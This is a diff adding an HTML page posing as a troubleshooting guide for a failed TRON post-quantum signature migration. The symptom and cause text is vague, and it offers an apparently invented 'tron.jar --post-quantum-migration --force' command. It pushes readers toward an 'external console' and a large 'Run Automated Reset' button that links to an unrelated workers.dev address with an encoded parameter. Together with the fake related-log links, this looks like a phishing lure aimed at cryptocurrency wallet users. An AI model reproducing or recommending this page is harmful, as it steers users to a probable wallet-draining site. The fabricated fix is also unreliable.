@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>TRON Post-Quantum Signature Migration Failed – Fix Guide</title>
+<style>
+    body {
+        font-family: system-ui;
+        background: #121214;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: none;
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #00adb5; }
+    .btn {
+        background: #ff9455;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>TRON Post-Quantum Signature Migration Failed</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users are experiencing issues with the TRON network, where transactions are not being processed due to a failure in the post-quantum signature migration process. The error message indicates that the migration has failed, causing disruptions to the network.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to the incompatibility of the existing signature scheme with the new post-quantum signature scheme, which is designed to provide enhanced security against quantum computer attacks.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To resolve the issue, the following manual overrides can be applied:</li>
+<li>Update the <code>tron.jar</code> file to the latest version</li>
+<li>Configure the <code>config.conf</code> file to enable post-quantum signature support</li>
+<li>Run the following command to manually trigger the migration process:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>java<span class="w"> </span>-jar<span class="w"> </span>tron.jar<span class="w"> </span>--post-quantum-migration<span class="w"> </span>--force
+</code></pre></div>
+
+<p>For a seamless experience, consider using an external console for executing these commands. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Java 11 or later installed on the system</li>
+<li>TRON network node set up and running</li>
+<li>Latest version of the <code>tron.jar</code> file downloaded</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
